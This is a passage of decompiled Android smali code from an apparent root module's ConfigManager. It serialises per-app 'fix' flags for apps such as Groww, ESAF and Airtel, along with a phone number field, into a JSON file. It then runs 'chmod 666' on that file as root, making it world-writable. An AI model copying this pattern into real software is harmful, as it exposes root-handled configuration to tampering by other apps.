    iget-boolean v5, p1, Lcom/rebel/module/ConfigManager$ConfigData;->fix_groww:Z

    invoke-virtual {v4, v5}, Landroid/util/JsonWriter;->value(Z)Landroid/util/JsonWriter;

    .line 1005
    const-string v4, "groww_mobile_no"

    invoke-virtual {v3, v4}, Landroid/util/JsonWriter;->name(Ljava/lang/String;)Landroid/util/JsonWriter;

    move-result-object v4

    iget-object v5, p1, Lcom/rebel/module/ConfigManager$ConfigData;->groww_mobile_no:Ljava/lang/String;

    if-eqz v5, :cond_8

    iget-object v6, p1, Lcom/rebel/module/ConfigManager$ConfigData;->groww_mobile_no:Ljava/lang/String;

    :cond_8
    invoke-virtual {v4, v6}, Landroid/util/JsonWriter;->value(Ljava/lang/String;)Landroid/util/JsonWriter;

    .line 1006
    const-string v4, "fix_esaf"

    invoke-virtual {v3, v4}, Landroid/util/JsonWriter;->name(Ljava/lang/String;)Landroid/util/JsonWriter;

    move-result-object v4

    iget-boolean v5, p1, Lcom/rebel/module/ConfigManager$ConfigData;->fix_esaf:Z

    invoke-virtual {v4, v5}, Landroid/util/JsonWriter;->value(Z)Landroid/util/JsonWriter;

    .line 1007
    const-string v4, "fix_esaf_native"

    invoke-virtual {v3, v4}, Landroid/util/JsonWriter;->name(Ljava/lang/String;)Landroid/util/JsonWriter;

    move-result-object v4

    iget-boolean v5, p1, Lcom/rebel/module/ConfigManager$ConfigData;->fix_esaf_native:Z

    invoke-virtual {v4, v5}, Landroid/util/JsonWriter;->value(Z)Landroid/util/JsonWriter;

    .line 1008
    const-string v4, "fix_zagg"

    invoke-virtual {v3, v4}, Landroid/util/JsonWriter;->name(Ljava/lang/String;)Landroid/util/JsonWriter;

    move-result-object v4

    iget-boolean v5, p1, Lcom/rebel/module/ConfigManager$ConfigData;->fix_zagg:Z

    invoke-virtual {v4, v5}, Landroid/util/JsonWriter;->value(Z)Landroid/util/JsonWriter;

    .line 1009
    const-string v4, "fix_airtel"

    invoke-virtual {v3, v4}, Landroid/util/JsonWriter;->name(Ljava/lang/String;)Landroid/util/JsonWriter;

    move-result-object v4

    iget-boolean v5, p1, Lcom/rebel/module/ConfigManager$ConfigData;->fix_airtel:Z

    invoke-virtual {v4, v5}, Landroid/util/JsonWriter;->value(Z)Landroid/util/JsonWriter;

    .line 1010
    invoke-virtual {v3}, Landroid/util/JsonWriter;->endObject()Landroid/util/JsonWriter;

    .line 1011
    invoke-virtual {v3}, Landroid/util/JsonWriter;->flush()V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 1013
    const/4 v4, 0x1

    :try_start_3
    invoke-virtual {v2, v4, v1}, Ljava/io/File;->setReadable(ZZ)Z

    .line 1014
    invoke-virtual {v2, v4, v1}, Ljava/io/File;->setWritable(ZZ)Z
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    .line 1016
    goto :goto_8

    .line 1015
    :catch_0
    move-exception v5

    .line 1017
    :goto_8
    :try_start_4
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "chmod 666 "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {p0, v0}, Lcom/rebel/module/ConfigManager;->escapeShellArg(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Lcom/rebel/module/ConfigManager;->runAsRoot(Ljava/lang/String;)Z

    .line 1018
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->configCache:Ljava/util/concurrent/atomic/AtomicReference;

    new-instance v5, Lcom/rebel/module/ConfigManager$ConfigData;

    invoke-direct {v5, p1}, Lcom/rebel/module/ConfigManager$ConfigData;-><init>(Lcom/rebel/module/ConfigManager$ConfigData;)V

    invoke-virtual {v0, v5}, Ljava/util/concurrent/atomic/AtomicReference;->set(Ljava/lang/Object;)V

    .line 1019
    iput-boolean v4, p0, Lcom/rebel/module/ConfigManager;->cacheValid:Z

    .line 1020
    invoke-virtual {v2}, Ljava/io/File;->lastModified()J

    move-result-wide v5

    iput-wide v5, p0, Lcom/rebel/module/ConfigManager;->lastFileModified:J

    .line 1021
    invoke-virtual {v3}, Landroid/util/JsonWriter;->close()V
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    .line 1022
    nop

    .line 1037
    iget-object v0, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 1022
    return v4

    .line 1023
    :catchall_0
    move-exception v0

    .line 1025
    .local v0, "th":Ljava/lang/Throwable;
    :try_start_5
    invoke-virtual {v3}, Landroid/util/JsonWriter;->close()V
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_1

    .line 1028
    goto :goto_9

    .line 1026
    :catchall_1
    move-exception v4

    .line 1027
    .local v4, "th2":Ljava/lang/Throwable;
    :try_start_6
    invoke-virtual {v0, v4}, Ljava/lang/Throwable;->addSuppressed(Ljava/lang/Throwable;)V

    .line 1029
    .end local v4    # "th2":Ljava/lang/Throwable;
    :goto_9
    nop

    .end local p1    # "configData":Lcom/rebel/module/ConfigManager$ConfigData;
    throw v0
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_1
    .catchall {:try_start_6 .. :try_end_6} :catchall_2

    .line 1037
    .end local v0    # "th":Ljava/lang/Throwable;
    .end local v2    # "file":Ljava/io/File;
    .end local v3    # "jsonWriter":Landroid/util/JsonWriter;
    .restart local p1    # "configData":Lcom/rebel/module/ConfigManager$ConfigData;
    :catchall_2
    move-exception v0

    goto :goto_a

    .line 1031
    :catch_1
    move-exception v0

    .line 1034
    .local v0, "e2":Ljava/lang/Exception;
    :try_start_7
    iput-boolean v1, p0, Lcom/rebel/module/ConfigManager;->cacheValid:Z
    :try_end_7
    .catchall {:try_start_7 .. :try_end_7} :catchall_2

    .line 1035
    nop

    .line 1037
    iget-object v2, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v2}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v2

    invoke-virtual {v2}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 1035
    return v1

    .line 1037
    .end local v0    # "e2":Ljava/lang/Exception;
    :goto_a
    iget-object v1, p0, Lcom/rebel/module/ConfigManager;->lock:Ljava/util/concurrent/locks/ReentrantReadWriteLock;

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock;->writeLock()Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/concurrent/locks/ReentrantReadWriteLock$WriteLock;->unlock()V

    .line 1038
    throw v0
.end method
